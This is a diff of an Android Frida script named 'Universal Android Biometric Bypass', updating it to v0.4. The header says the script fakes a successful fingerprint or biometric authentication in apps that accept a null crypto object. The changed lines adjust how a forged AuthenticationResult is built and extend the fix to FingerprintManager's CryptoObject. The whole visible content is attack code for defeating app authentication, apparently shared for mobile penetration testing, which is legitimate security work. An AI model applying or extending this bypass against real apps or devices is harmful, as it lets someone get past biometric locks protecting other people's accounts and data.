@@ -1,11 +1,9 @@
 /*
-	Universal Android Biometric Bypass v0.3
+	Universal Android Biometric Bypass v0.4
 	author: ax - github.com/ax
-
 	Updated Android biometric bypass script (from Kamil Breński, Krzysztof Pranczk and Mateusz Fruba, August 2019)
 	This script will bypass authentication when the crypto object is not used.
 	The authentication implementation relies on the callback onAuthenticationSucceded being called. 
-
     Bypass fingerprint authentication if the app accept NULL cryptoObject in onAuthenticationSucceeded(...).
     This script should automatically bypass fingerprint when authenticate(...) method will be called.
 */
@@ -50,10 +48,12 @@ function getArgsTypes(overloads) {
 }
 
 function getAuthResult(resultObj, cryptoInst) {
-	var clax = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
+	//var clax = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
+	var clax = resultObj;
 	var resu = getArgsTypes(clax['$init'].overloads);
 	//console.log(resu);
 	resu = resu.replace(/\'android\.hardware\.biometrics\.BiometricPrompt\$CryptoObject\'/, 'cryptoInst');
+	resu = resu.replace(/\'android\.hardware\.fingerprint\.FingerprintManager\$CryptoObject\'/, 'cryptoInst');
 	resu = resu.replace('\'int\'', '0');
 	resu = resu.replace('\'boolean\'', 'false');
 	resu = resu.replace(/'.*'/, 'null');
@@ -146,8 +146,6 @@ function hookFingerprintManager_authenticate() {
 Error: authenticate(): has more than one overload, use .overload(<signature>) to choose from:
     .overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler')
     .overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler', 'int')
-
-
     */
     var fingerprintManager = null;
     var cryptoObj = null;
